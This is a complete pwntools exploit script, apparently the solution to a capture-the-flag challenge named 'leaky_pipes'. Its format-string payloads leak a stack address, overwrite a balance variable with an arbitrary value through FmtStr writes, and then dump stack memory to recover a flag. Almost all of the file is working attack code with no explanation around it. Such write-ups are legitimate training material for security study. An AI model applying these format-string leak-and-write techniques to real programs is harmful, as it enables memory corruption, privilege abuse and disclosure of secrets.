from pwn import *

context.arch = 'x86_64'
p = process('./leaky_pipes')

#host = os.environ['CI_REGISTRY_IMAGE'].replace('/', '-')
#p = remote(host, port)

#gdb.attach(p)
def exec_fmt(payload):
	p.sendline(payload)
	#print(payload)
	return p.recvline()

p.recv()
p.sendline('1')
pay = 'a'*8 + ' %18$p'
p.sendline(pay)

p.recvuntil('aaaaaaaa ')
leak = p.recvline()[:-1]

bal = int(leak, 16) + 0x2ab0
info("bal: %s", hex(bal))

p.sendline('1')

f = FmtStr(exec_fmt, offset=6)
f.write(bal, 200)
f.execute_writes()

p.recv()
p.sendline('2')

p.recv()
p.sendline('3')
p.sendline('%16$p %17$p %18$p %19$p %20$p %21$p')

p.recvuntil("Please give us your feedback!\n")
s = p.recvline()[:-1].split(' ')
flag = ''
for i in s:
	flag += p64(int(i, 16))
info("flag: %s"%flag[:-2])
p.interactive()
